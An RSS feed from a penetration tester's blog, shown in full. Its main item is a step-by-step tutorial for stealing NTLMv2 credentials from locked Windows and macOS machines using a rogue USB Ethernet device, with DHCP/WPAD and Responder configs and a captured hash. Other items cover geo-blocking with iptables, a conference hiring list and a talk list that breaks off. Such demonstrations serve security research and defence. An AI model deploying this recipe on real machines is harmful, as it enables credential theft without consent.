<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Post-rsses on Room362</title>
    <link>https://room362.com/post/index.xml</link>
    <description>Recent content in Post-rsses on Room362</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016. All rights reserved.</copyright>
    <lastBuildDate>Fri, 28 Oct 2016 15:00:00 -0400</lastBuildDate>
    <atom:link href="https://room362.com/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Blocking countries via iptables</title>
      <link>https://room362.com/post/2016/blocking-countries-via-iptables/</link>
      <pubDate>Fri, 28 Oct 2016 15:00:00 -0400</pubDate>
      
      <guid>https://room362.com/post/2016/blocking-countries-via-iptables/</guid>
      <description>&lt;p&gt;With all of the scanning / noise on the Internet, it&amp;rsquo;s nice to get rid of a large chunk of it simply by blocking an entire country&amp;rsquo;s worth of IP space. To do that you can simply use a kernel module for iptables called &amp;ldquo;xtables-addons&amp;rdquo;. On Debian/Ubuntu it&amp;rsquo;s pretty easy to get going, just &lt;code&gt;apt-get&lt;/code&gt; install the needed perl library and the addons themselves:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install libtext-csv-xs-perl xtables-addons-common
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;!Warning: This does require proper linux headers to be available to compile the kernel module. In the case of where these aren&amp;rsquo;t availabe (like Linode&amp;rsquo;s special kernel), you will need to find another way to get the correct headers installed.&lt;/p&gt;

&lt;p&gt;Then download the Maxmind geo database, the location of the &lt;code&gt;xt_geoip_dl&lt;/code&gt; tool that does this is dependent on the installed version of xtables-addons. For my testing I have found it in &lt;code&gt;/usr/src/xtables-addons-2.6/geoip/&lt;/code&gt; as well as &lt;code&gt;/usr/lib/xtables-addons/&lt;/code&gt; YMMV.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd /usr/src/xtables-addons-2.6/geoip/
./xt_geoip_dl
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You should see it downloading the IP databases:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;--2016-10-28 13:55:24--  http://geolite.maxmind.com/download/geoip/database/GeoIPv6.csv.gz
Length: 1303811 (1.2M) [application/octet-stream]
Saving to: ‘GeoIPv6.csv.gz’

GeoIPv6.csv.gz                                  100%[=========================================================================================================&amp;gt;]   1.24M  --.-KB/s   in 0.004s

2016-10-28 13:55:24 (321 MB/s) - ‘GeoIPv6.csv.gz’ saved [1303811/1303811]

--2016-10-28 13:55:24--  http://geolite.maxmind.com/download/geoip/database/GeoIPCountryCSV.zip
Saving to: ‘GeoIPCountryCSV.zip’

GeoIPCountryCSV.zip                             100%[=========================================================================================================&amp;gt;]   2.04M  --.-KB/s   in 0.006s

2016-10-28 13:55:24 (326 MB/s) - ‘GeoIPCountryCSV.zip’ saved [2137625/2137625]

FINISHED --2016-10-28 13:55:24--
Total wall clock time: 0.1s
Downloaded: 2 files, 3.3M in 0.01s (324 MB/s)
Archive:  GeoIPCountryCSV.zip
  inflating: GeoIPCountryWhois.csv

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After that, you need to &amp;ldquo;build&amp;rdquo; the lists by performing the following command in that same directory (one install didn&amp;rsquo;t automatically make the directory so ensure it&amp;rsquo;s there with the mkdir command):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mkdir -p /usr/share/xt_geoip
./xt_geoip_build -D /usr/share/xt_geoip *.csv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After that you are off the the races and you can simply use the geoip module as so now:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;iptables -A INPUT -m geoip --src-cc CN -j DROP
iptables -A INPUT -m geoip --src-cc HK -j DROP
iptables -A INPUT -m geoip --src-cc RU -j DROP
iptables -A INPUT -m geoip --src-cc KR -j DROP
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Or you can go the other route and just allow from your country:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;iptables -A INPUT -m geoip --src-cc PL -m tcp -p tcp --dport 22 -j ACCEPT
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When looking up how to do this many people recommended updating the GeoIP database once a month. To do this I made a really simple bash script that just repeats all the things I did and added it to a monthly cron job:&lt;/p&gt;

&lt;p&gt;File: 0update_maxmind&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/bash

rm -f /usr/src/xtables-addons-2.6/geoip/*.csv
rm -rf /usr/share/xt_geoip/*
cd /usr/src/xtables-addons-2.6/geoip/
./xt_geoip_dl
./xt_geoip_build -D /usr/share/xt_geoip *.csv
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Setting the cronjob:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;chmod +x 0update_maxmind
mv 0update_maxmind /etc/cront.monthly/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;References I found useful:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://xtables-addons.sourceforge.net/geoip.php&#34;&gt;http://xtables-addons.sourceforge.net/geoip.php&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.internetstaff.com/frustrate-ssh-scanners-geoip-iptables-blocking/&#34;&gt;https://www.internetstaff.com/frustrate-ssh-scanners-geoip-iptables-blocking/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.linode.com/stackscripts/view/3807-jeffkyjin-ipp2p+filtering&#34;&gt;https://www.linode.com/stackscripts/view/3807-jeffkyjin-ipp2p+filtering&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Snagging creds from locked machines</title>
      <link>https://room362.com/post/2016/snagging-creds-from-locked-machines/</link>
      <pubDate>Tue, 06 Sep 2016 07:35:28 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/snagging-creds-from-locked-machines/</guid>
      <description>

&lt;p&gt;First off, this is dead simple and shouldn&amp;rsquo;t work, but it does. Also, there is no possible way that I&amp;rsquo;m the first one that has identified this, but here it is (&lt;strong&gt;trust me, I tested it so many ways to confirm it because I couldn&amp;rsquo;t believe it was true&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TL;DR&lt;/strong&gt; USB Ethernet + DHCP + Responder == Creds&lt;/p&gt;

&lt;h1 id=&#34;thesis&#34;&gt;Thesis:&lt;/h1&gt;

&lt;p&gt;If I plug in a device that masquerades as a USB Ethernet adapter and has a computer on the other end, can I capture credentials from a system, even when locked out (yes, logged in, just locked). (..or do even more, but we&amp;rsquo;ll save that for another time, this post is already too long)&lt;/p&gt;

&lt;h2 id=&#34;device-setup&#34;&gt;Device Setup&lt;/h2&gt;

&lt;p&gt;I started off with a &lt;a href=&#34;https://inversepath.com/usbarmory&#34;&gt;USB Armory&lt;/a&gt; ($155) but below I&amp;rsquo;ll show you how to do this with a &lt;a href=&#34;http://hakshop.myshopify.com/collections/lan-turtle/products/lan-turtle&#34;&gt;Hak5 Turtle&lt;/a&gt; ($49.99) as well.&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll leave the setting up of the base device itself to you, but here are some links that can start you on your way:&lt;/p&gt;

&lt;h3 id=&#34;usb-armory&#34;&gt;USB Armory&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Debian/Jessie - &lt;a href=&#34;https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card&#34;&gt;https://github.com/inversepath/usbarmory/wiki/Starting#preparing-your-own-microsd-card&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Kali on USB Armory - &lt;a href=&#34;http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory&#34;&gt;http://docs.kali.org/kali-on-arm/kali-linux-on-usb-armory&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Resizing the SD partition - &lt;a href=&#34;http://base16.io/?p=61&#34;&gt;http://base16.io/?p=61&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;hak5-turtle&#34;&gt;Hak5 Turtle&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Turtle video guides and wiki: &lt;a href=&#34;https://lanturtle.com/wiki/#!videos.md&#34;&gt;https://lanturtle.com/wiki/#!videos.md&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;

&lt;p&gt;Basically the capturing is done with &lt;a href=&#34;https://twitter.com/pythonresponder&#34;&gt;Laurent Gaffié&amp;rsquo;s&lt;/a&gt; &lt;a href=&#34;https://github.com/lgandx/Responder&#34;&gt;Responder&lt;/a&gt; so you need to find a way to get Responder onto the device. The Hak5 Turtle already has a module for it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://room362.com/images/2016/turtleshell.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;You do have to &amp;ldquo;Enable&amp;rdquo; the module for the first time (plugged into Internet access) to get it to actually download all of dependencies and package itself.&lt;/p&gt;

&lt;p&gt;Then you also need to do a &lt;code&gt;opkg update&lt;/code&gt; and &lt;code&gt;opkg install python-openssl&lt;/code&gt; so that Responder will run correctly. This is only a temporary issue as the module is being fixed to include this step.&lt;/p&gt;

&lt;p&gt;As for the USB Armory is you can either use SCP, Internet Connection Sharing, the USB host/client adapter:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://room362.com/images/2016/usbarmory_host_adapter.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The default install of Debian/Jessie doesn&amp;rsquo;t have Python installed so you will have to work through all of the dependencies (on the Kali version this is not needed) and will require Internet access to perform:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;apt-get install -y python git python-pip python-dev screen sqlite3
pip install pycrypto
git clone https://github.com/spiderlabs/responder
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;configuration&#34;&gt;Configuration&lt;/h2&gt;

&lt;h3 id=&#34;armory&#34;&gt;Armory&lt;/h3&gt;

&lt;p&gt;First, setting up the interface isn&amp;rsquo;t needed but it will help with consistence since each image for the Armory come with different default IP addresses and it&amp;rsquo;s good to set a solid base.&lt;/p&gt;

&lt;h4 id=&#34;etc-network-interfaces&#34;&gt;/etc/network/interfaces&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;# interfaces(5) file used by ifup(8) and ifdown(8)
# Include files from /etc/network/interfaces.d:
source-directory /etc/network/interfaces.d
auto usb0
allow-hotplug usb0
iface usb0 inet static
  address 192.168.2.201
  netmask 255.255.255.0
  gateway 192.168.2.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we set up the DHCP server:&lt;/p&gt;

&lt;h4 id=&#34;etc-dhcp-dhcpd-conf&#34;&gt;/etc/dhcp/dhcpd.conf&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;ddns-update-style none;

option domain-name &amp;quot;domain.local&amp;quot;;
option domain-name-servers 192.168.2.201;

default-lease-time 60;
max-lease-time 72;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# A slightly different configuration for an internal subnet.
subnet 192.168.2.0 netmask 255.255.255.0 {
  range 192.168.2.1 192.168.2.2;
  option routers 192.168.2.201;
  option local-proxy-config &amp;quot;http://192.168.2.201/wpad.dat&amp;quot;;
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The only special configuration here is to send the &amp;ldquo;Proxy Config&amp;rdquo; option to any DHCP clients. Why this is even a thing I have no idea, but note this line:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&amp;ldquo;DHCP has a higher priority than DNS: if DHCP provides the WPAD URL, no DNS lookup is performed.&amp;rdquo;&lt;/strong&gt; from &lt;a href=&#34;https://en.wikipedia.org/wiki/Web_Proxy_Autodiscovery_Protocol&#34;&gt;the Wikipedia article on WPAD&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Next we set up things to automatically run. We edit the &lt;code&gt;rc.local&lt;/code&gt; file so that it does a few things:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Clears out all DHCP leases and start the DHCP server&lt;/strong&gt;. There is probably a more elegant way to do this, but because this &amp;ldquo;computer&amp;rdquo; is being plugged in and taken out pretty frequently, we could run into a max in leases but most likely the file will get corrupted at some point so we just remove and re-add it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Start Responder in a screen session&lt;/strong&gt;. This way we can get logging going on the screen session as a sort of backup for the Sqlite3 database and log files that Responder creates.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;etc-rc-local&#34;&gt;/etc/rc.local&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/sh -e

# Clear leases
rm -f /var/lib/dhcp/dhcpd.leases
touch /var/lib/dhcp/dhcpd.leases

# Start DHCP server
/usr/sbin/dhcpd

# Start Responder
/usr/bin/screen -dmS responder bash -c &#39;cd /root/responder/; python Responder.py -I usb0 -f -w -r -d -F&#39;

exit 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To enable logging of the screen sessions (which also gives you insight into if anything went wrong), you add a &lt;code&gt;.screenrc&lt;/code&gt; file. There is a lot more that I put in these, mostly for aesthetics but the important pieces are these:&lt;/p&gt;

&lt;h4 id=&#34;root-screenrc&#34;&gt;/root/.screenrc&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;# Logging
deflog on
logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That&amp;rsquo;s it, you should be able to reboot your USB Armory and start picking up creds anywhere you can stick a USB in.&lt;/p&gt;

&lt;h3 id=&#34;hak5-turtle-1&#34;&gt;Hak5 Turtle&lt;/h3&gt;

&lt;p&gt;Everything is pretty much already done for you, the only difference is that opkg is your package manager:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;opkg update
opkg install python-openssl screen
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Remove the symlink to /tmp/ so that the logs will stick around&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rm -rf /overlay/etc/turtle/Responder/logs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And the &lt;code&gt;/overlay/etc/rc.local&lt;/code&gt; file is slightly different&lt;/p&gt;

&lt;h4 id=&#34;overlay-etc-rc-local&#34;&gt;/overlay/etc/rc.local&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;/etc/init.d/dnsmasq stop
/usr/sbin/screen -dmS responder bash -c &#39;cd /overlay/etc/turtle/Responder; python Responder.py -I br-lan -f -w -r -d -F&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;why-does-this-work&#34;&gt;Why does this work?&lt;/h1&gt;

&lt;ol&gt;
&lt;li&gt;Because USB is Plug-and-Play. This means that even if a system is locked out, the device still gets installed. Now, I believe there are restrictions on what types of devices are allowed to install at a locked out state on newer operating systems (Win10/El Capitan), but Ethernet/LAN is definitely on the white list.&lt;/li&gt;
&lt;li&gt;Computers are constantly creating traffic, even if you don&amp;rsquo;t have any browsers or applications open, and most computers trust their local network for some reason (I know the technical bits on &amp;lsquo;why&amp;rsquo;, just complaining&amp;hellip;)&lt;/li&gt;
&lt;li&gt;Network preference when there are more than gateway or network connection is based on &amp;ldquo;metrics&amp;rdquo; on Windows and a combination of metrics and &lt;a href=&#34;https://support.apple.com/kb/PH18458?locale=en_US&#34;&gt;&amp;ldquo;preference&amp;rdquo; on OSX&lt;/a&gt;, but by default &amp;ldquo;wired&amp;rdquo; and &amp;ldquo;newer/faster&amp;rdquo; always win out.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This means that by plugging in the device it quickly becomes the gateway, DNS server, WPAD server and others thanks to Responder.&lt;/p&gt;

&lt;p&gt;The average time for freshly inserted into a locked workstation and by the time I have creds is about 13 seconds, all depends on the system. Some addition setup I used inotify to watch for a file change in the &lt;code&gt;Responder.db&lt;/code&gt; database and shutdown the Armory. This helps finalize file writes as well and giving me an indicator via the LED that creds were obtained.&lt;/p&gt;

&lt;p&gt;To do that you need to install the &lt;code&gt;inotify-tools&lt;/code&gt; package and add the following to the &lt;code&gt;rc.local&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;echo &amp;quot;Staring cred watch&amp;quot; &amp;gt;&amp;gt; /root/rc.log
/usr/bin/screen -dmS notify bash -c &#39;while inotifywait -e modify /root/responder/Responder.db; do shutdown -h now; done&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;end-result&#34;&gt;End Result:&lt;/h1&gt;

&lt;p&gt;What you see in the video is the Windows 10 lock screen (Full screened fresh install VM). When the LED goes solid white the Armory has fully shutdown because of the watch script, creds achieved!.&lt;/p&gt;


&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;//www.youtube.com/embed/Oplubg5q7ao&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
 &lt;/div&gt;


&lt;p&gt;Bring it back home and look at the results:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~# sqlite3 /root/responder/Responder.db &#39;select * from responder&#39;
2016-09-04 10:59:43|HTTP|NTLMv2|192.168.2.1||SITTINGDUCK\mubix||5EAEA2859C397D8AE48CA87F:01010000000001E9D23F49F7891F38965D80A0010000000000000000000000000000000900260048005400540050002F007800780066006600730062006E0070006300000000000000....
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sweet!! Game over!&lt;/p&gt;

&lt;p&gt;Tested on:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Windows 98 SE&lt;/li&gt;
&lt;li&gt;Windows 2000 SP4&lt;/li&gt;
&lt;li&gt;Windows XP SP3&lt;/li&gt;
&lt;li&gt;Windows 7 SP1&lt;/li&gt;
&lt;li&gt;Windows 10 (Enterprise and Home)&lt;/li&gt;
&lt;li&gt;OSX El Capitan / Mavericks (I was able to get creds on both of these but I&amp;rsquo;m still testing to see if it was a fluke, or my own configurations)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I still have not tested on Linux, I will make a new post on if that works. Please leave comments below if you see things I can improve upon, or errors.&lt;/p&gt;

&lt;h3 id=&#34;usb-armory-vs-hak5-lan-turtle&#34;&gt;USB Armory vs Hak5 LAN Turtle&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;The Armory is more versitile with APT package to do more fun, definitely a great way to dev the attack. More storage (SD based) and slightly faster processor&lt;/li&gt;
&lt;li&gt;Hak5 LAN Turtle is MUCH easier to pass off when you are trying to plug in a device during an SE attack. It might not have the LED that the Armory does for determining when creds are achieved, but it has the added functionality of a working ethernet port, so you could get creds AND a shell. Definitely worth the extra hassel to get it working right.&lt;/li&gt;
&lt;/ol&gt;
</description>
    </item>
    
    <item>
      <title>2016 DerbyCon Hiring List</title>
      <link>https://room362.com/post/2016/2016-derbycon-hiring-list/</link>
      <pubDate>Wed, 17 Aug 2016 11:30:44 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/2016-derbycon-hiring-list/</guid>
      <description>&lt;p&gt;Created the 2016 UNOFFICIAL DerbyCon Hiring List. To get on the list is even easier now! Just complete the following form: &lt;a href=&#34;https://goo.gl/forms/LW5b1xo4O9D8eVZU2&#34;&gt;https://goo.gl/forms/LW5b1xo4O9D8eVZU2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;(One small tip, first come first serve, so if you want to be on the top of the list it&amp;rsquo;s best to submit the best info you have vs waiting on anyone, I don&amp;rsquo;t change the list order for anyone.)&lt;/p&gt;

&lt;p&gt;Direct Link to Google Doc: &lt;a href=&#34;https://docs.google.com/spreadsheets/d/1qlJYhdxljG4f1vHhj5-Vyj5wiRb3YBjQJU4Cqh2cT6k/edit?usp=sharing&#34;&gt;https://docs.google.com/spreadsheets/d/1qlJYhdxljG4f1vHhj5-Vyj5wiRb3YBjQJU4Cqh2cT6k/edit?usp=sharing&lt;/a&gt;&lt;/p&gt;

&lt;iframe height=&#34;1200&#34; src=&#34;https://docs.google.com/spreadsheets/d/1qlJYhdxljG4f1vHhj5-Vyj5wiRb3YBjQJU4Cqh2cT6k/pubhtml?gid=0&amp;amp;single=true&amp;amp;widget=true&amp;amp;headers=false&#34; width=&#34;900&#34;&gt;&lt;/iframe&gt;
</description>
    </item>
    
    <item>
      <title>BlackHat/Def Con/BSides Talk Picks for 2016</title>
      <link>https://room362.com/post/2016/blackhat-defcon-bsides-talk-picks-2016/</link>
      <pubDate>Sun, 24 Jul 2016 07:35:28 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/blackhat-defcon-bsides-talk-picks-2016/</guid>
      <description>

&lt;p&gt;Each year I make up a list the week before Blackhat and Def Con of talks that I &amp;ldquo;can&amp;rsquo;t miss&amp;rdquo; and some that I want to see (and use it for video watching afterwards for those I missed). This year I thought I would share that list here. I will be breaking them down by each day of the events by time slot. Any talk I have a 🌟 by, is a &amp;ldquo;Must see&amp;rdquo; for me.&lt;/p&gt;

&lt;p&gt;If you are a blogger as well, I&amp;rsquo;d love to see other people&amp;rsquo;s picks. Drop me a link in the comments below or on Facebook/Twitter&lt;/p&gt;

&lt;h1 id=&#34;bsideslv&#34;&gt;BSidesLV&lt;/h1&gt;

&lt;h2 id=&#34;aug-2-tuesday&#34;&gt;Aug 2 - Tuesday&lt;/h2&gt;

&lt;p&gt;Unfortunately I&amp;rsquo;ll have to miss these due to teaching, but these are the ones I would go to if I could.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;11:45

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bsideslv2016.sched.org/event/7azc/are-you-a-pentexter-open-sourcing-pentest-reporting-and-automation&#34;&gt;Are you a PenTexter? Open source pentest reporting and automation&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Any time someone releases a tool that makes reporting easier, I&amp;rsquo;m in&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;4:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bsideslv2016.sched.org/event/7azZ/ingress-egress-the-emerging-threats-posed-by-augmented-reality-gaming&#34;&gt;Ingress Egress&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Ingress (AND POKEMON GO) players should attend this.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;aug-3-wednesday&#34;&gt;Aug 3 - Wednesday&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;10:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bsideslv2016.sched.org/event/7Yc2/crafting-tailored-wordlists-with-wordsmith&#34;&gt;Crafting tailored wordlists with Wordsmith&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Better wordlists are always a plus. Wonder how they factor in companies with multiple offices in multiple states. Could be awesome if you could just input a list of addresses. We&amp;rsquo;ll see&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;2:00

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://bsideslv2016.sched.org/event/7azR/six-degrees-of-domain-admin-using-bloodhound-to-automate-active-directory-domain-privilege-escalation-analysis&#34;&gt;Six Degrees of Domain Admin - Using &amp;ldquo;BloodHound&amp;rdquo; to automate Active Directory domain privilege escalation analysis&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Graph theory applied to derivative admin, what&amp;rsquo;s not to love?&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;2:30

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bsideslv2016.sched.org/event/7ZXn/latest-evasion-techniques-in-fileless-malware&#34;&gt;Latest evasion techniques in fileless malware&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Fileless malware techniques plus new ones&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;3:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bsideslv2016.sched.org/event/7azN/is-that-a-penguin-in-my-windows&#34;&gt;Is that a penguin in my Windows?&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;A bunch of talks on Linux on Windows at BlackHat, but I bet Spencer&amp;rsquo;s at BSidesLV will be the one to see.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;6:00

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://bsideslv2016.sched.org/event/7azY/one-compromise-to-rule-them-all&#34;&gt;One compromise to rule them all&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;EmPyre module releases that target ZooKeeper, Marathon, Chronos, Mesos, Docker, and HAProxy&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;blackhat&#34;&gt;BlackHat&lt;/h1&gt;

&lt;h2 id=&#34;aug-3-wednesday-1&#34;&gt;Aug 3 - Wednesday&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;10:20 - 11:10

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#http2--quic---teaching-good-protocols-to-do-bad-things-3126&#34;&gt;HTTP/2 &amp;amp; QUIC - Teaching good protocols to do bad things&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;I&amp;rsquo;ll be honest, I&amp;rsquo;ll definitely be attending this one because Vyrus talks and releases cool stuff&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#the-linux-kernel-hidden-inside-windows-10-3154&#34;&gt;The Linux kernel hidden inside Windows 10&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;This is another one, Ionescu literally wrote the book(s) on Windows Internals&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;11:30 - 12:20

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#a-journey-from-jndildap-manipulation-to-remote-code-execution-dream-land-3345&#34;&gt;A journey from JNDI/LDAP manipulation to remote code execution dream land&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;If I can get RCE from JNDI/LDAP I&amp;rsquo;m in, hopefully this isn&amp;rsquo;t just a review of CVE-2015-4902&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;1:50 - 2:40

&lt;ul&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#certificate-bypass-hiding-and-executing-malware-from-a-digitally-signed-executable-3984&#34;&gt;Certificate Bypass: Hiding and executing malware from a digitally signed executable&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Putting evil stuff in signed binaries without making the certificate check fail. Sweeeeet! Hope they release a tool or at least go into enough detail to make one.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;3:00 - 3:50

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#pwning-your-java-messaging-with-deserialization-vulnerabilities-3018&#34;&gt;Pwning your java messaging with deserialization vulnerabilities&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Deserialization is the new(ish) hotness, I want to learn more about it.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#recover-a-rsa-private-key-from-a-tls-session-with-perfect-forward-secrecy-3046&#34;&gt;Recover a RSA private key from a TLS session with perfect forward secrecy&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;Wondering if it&amp;rsquo;s another &amp;ldquo;in these perfect conditions&amp;rdquo; SSL talk, or it&amp;rsquo;s the real deal, what swayed me on this one was the tool release.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;4:20 - 5:10

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#account-jumping-post-infection-persistency--lateral-movement-in-aws-4309&#34;&gt;Account jumping, Post Infection Persistency and Lateral movement in AWS&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;I have only been a user of AWS, not seen access on any tests yet, definitely interested on how to abuse access when/if I do.&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;🌟 &lt;a href=&#34;https://www.blackhat.com/us-16/briefings/schedule/#crippling-https-with-unholy-pac-3778&#34;&gt;Crippling HTTPS with Unholy PAC&lt;/a&gt;

&lt;ul&gt;
&lt;li&gt;I use PAC files a lot, so I&amp;rsquo;m very curious how these can be manipulated further&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
